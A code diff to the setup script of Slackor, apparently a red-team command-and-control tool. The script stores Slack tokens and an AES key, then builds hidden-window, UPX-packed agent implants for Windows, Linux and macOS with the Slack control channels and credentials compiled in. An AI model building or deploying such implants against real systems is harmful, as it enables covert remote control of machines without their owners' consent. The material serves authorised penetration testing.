@@ -1,10 +1,11 @@
-import os
-import sys
+import hashlib
 import json
+import os
 import random
-import sqlite3
 import requests
+import sqlite3
 import subprocess
+import sys
 
 # Initialize variables
 commands = None
@@ -90,8 +91,8 @@ except OSError:
     pass
 conn = sqlite3.connect('slackor.db')
 print("Creating AES key...")
-AESkey = ''.join(random.choice('0123456789ABCDEF') for n in range(32))
-print(AESkey)
+aes_key = ''.join(random.choice('0123456789ABCDEF') for n in range(32))
+print(aes_key)
 print("Created new database file...")
 print("Putting keys in the database...")
 # Create table for  keys
@@ -100,7 +101,7 @@ conn.execute('''CREATE TABLE KEYS
          TOKEN           TEXT    NOT NULL,
          BEARER           TEXT    NOT NULL,
          AES            TEXT     NOT NULL);''')
-conn.execute("INSERT INTO KEYS (ID,TOKEN,BEARER,AES) VALUES ('1', '" + token + "','" + bearer + "','" + AESkey + "')")
+conn.execute("INSERT INTO KEYS (ID,TOKEN,BEARER,AES) VALUES ('1', '" + token + "','" + bearer + "','" + aes_key + "')")
 
 print("Adding slack channels to the database...")
 
@@ -125,5 +126,19 @@ conn.close()
 print("Database created successfully")
 
 # Build exe and pack with UPX
-subprocess.run(["bash", "-c", "GOOS=windows GOARCH=amd64 go build -ldflags \"-s -w -H windowsgui -X main.responses=%s -X main.registration=%s -X main.commands=%s -X main.bearer=%s -X main.token=%s -X main.key=%s\" agent.go" % (responses, registration, commands, bearer, token, AESkey)])
-subprocess.run(["bash", "-c", "upx --force agent.exe"])
+subprocess.run(["bash", "-c", "GO111MODULE=on GOOS=windows GOARCH=amd64 go build -o dist/agent.windows.exe -ldflags \"-s -w -H windowsgui -X github.com/Coalfire-Research/Slackor/internal/config.ResponseChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.RegistrationChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.CommandsChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.Bearer=%s -X github.com/Coalfire-Research/Slackor/internal/config.Token=%s -X github.com/Coalfire-Research/Slackor/internal/config.CipherKey=%s -X github.com/Coalfire-Research/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
+subprocess.run(["bash", "-c", "cp -p dist/agent.windows.exe dist/agent.upx.exe"])
+subprocess.run(["bash", "-c", "upx --force dist/agent.upx.exe"])
+
+# Build for linux and macOS
+subprocess.run(["bash", "-c", "GO111MODULE=on GOOS=linux GOARCH=amd64 go build -o dist/agent.64.linux -ldflags \"-s -w -X github.com/Coalfire-Research/Slackor/internal/config.ResponseChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.RegistrationChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.CommandsChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.Bearer=%s -X github.com/Coalfire-Research/Slackor/internal/config.Token=%s -X github.com/Coalfire-Research/Slackor/internal/config.CipherKey=%s -X github.com/Coalfire-Research/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
+subprocess.run(["bash", "-c", "GO111MODULE=on GOOS=linux GOARCH=386 go build -o dist/agent.32.linux -ldflags \"-s -w -X github.com/Coalfire-Research/Slackor/internal/config.ResponseChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.RegistrationChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.CommandsChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.Bearer=%s -X github.com/Coalfire-Research/Slackor/internal/config.Token=%s -X github.com/Coalfire-Research/Slackor/internal/config.CipherKey=%s -X github.com/Coalfire-Research/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
+subprocess.run(["bash", "-c", "GO111MODULE=on GOOS=darwin GOARCH=amd64 go build -o dist/agent.darwin -ldflags \"-s -w -X github.com/Coalfire-Research/Slackor/internal/config.ResponseChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.RegistrationChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.CommandsChannel=%s -X github.com/Coalfire-Research/Slackor/internal/config.Bearer=%s -X github.com/Coalfire-Research/Slackor/internal/config.Token=%s -X github.com/Coalfire-Research/Slackor/internal/config.CipherKey=%s -X github.com/Coalfire-Research/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
+
+# Print hashes
+filenames = ["dist/agent.windows.exe", "dist/agent.upx.exe", "dist/agent.64.linux", "dist/agent.32.linux", "dist/agent.darwin"]
+for filename in filenames:
+    # TODO: use buffers/hash update if the agent ever gets big
+    f = open(filename, 'rb').read()
+    h = hashlib.sha256(f).hexdigest()
+    print(h + "  " + filename)
